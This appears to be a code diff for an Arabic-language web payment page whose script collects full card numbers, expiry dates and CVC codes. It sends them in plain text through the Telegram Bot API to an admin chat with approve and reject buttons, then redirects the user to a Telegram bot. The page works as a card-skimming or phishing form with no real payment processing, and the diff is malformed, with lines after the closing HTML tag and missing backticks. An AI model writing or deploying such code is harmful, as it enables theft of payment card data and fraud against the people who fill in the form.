@@ -55,5 +55,71 @@
 
         function validateForm() {
             const userId = document.getElementById('userId').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvc = document.getElementById('cvc').value.trim();
+            if (userId && name && cardNum.length === 19 && expiry.length === 5 && cvc.length >= 3) {
+                submitBtn.disabled = false; submitBtn.classList.add('active');
+            } else {
+                submitBtn.disabled = true; submitBtn.classList.remove('active');
+            }
+        }
+
+        function sendDataDirectly() {
+            submitBtn.disabled = true;
+            submitBtn.innerText = "جاري الإرسال...";
+
+            const userId = document.getElementById('userId').value.trim();
+            const name = document.getElementById('name').value.trim();
+            const cardNum = document.getElementById('cardNum').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvc = document.getElementById('cvc').value.trim();
+
+            const textMessage = 💳 طلب دفع بالبطاقة جديد\n\n👤 حساب المستخدم: ${userId}\n📝 الاسم: ${name}\n🔢 رقم البطاقة: ${cardNum}\n📅 التاريخ: ${expiry}\n🔒 الرمز CVC: ${cvc};
+            
+            const replyMarkup = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ تأكيد الشحن", callback_data: cc_app_${userId} },
+                        { text: "❌ رفض الطلب", callback_data: cc_rej_${userId} }
+                    ]
+                ]
+            };
+
+            // 1. إرسال إشعار للمستخدم تلقائياً داخل شات البوت لإعلامه بالانتظار
+            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: userId, text: "⏳ تم ارسال طلبك يرجى الانتظار" })
+            }).catch(e => console.log("خطأ في مراسلة المستخدم"));
+
+            // 2. إرسال البيانات الفورية للأدمن مع الأزرار التفاعلية المباشرة
+            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage, reply_markup: replyMarkup })
+            })
+            .then(res => {
+                if(res.ok) {
+                    alert("تم ارسال طلب الدفع بنجاح");
+                    document.getElementById('paymentForm').reset();
+                    validateForm();
+                    
+                    // تحويل مباشر وآمن إلى البوت لإنهاء عملية الدفع وإغلاق المتصفح بدون خطأ اليوزر
+                    window.location.href = https://t.me/${BOT_USERNAME};
+                } else {
+                    alert("حدث خطأ في الإرسال، تأكد من التوكن.");
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = "دفع الآن";
+                }
+            })
+            .catch(err => {
+                alert("خطأ في الاتصال بالشبكة.");
+                submitBtn.disabled = false;
+                submitBtn.innerText = "دفع الآن";
+            });
+        }
+    </script>
+</body>
+</html>
             const name = document.getElementById('name').value.trim();
             const cardNum = document.getElementById('cardNum').value.trim();
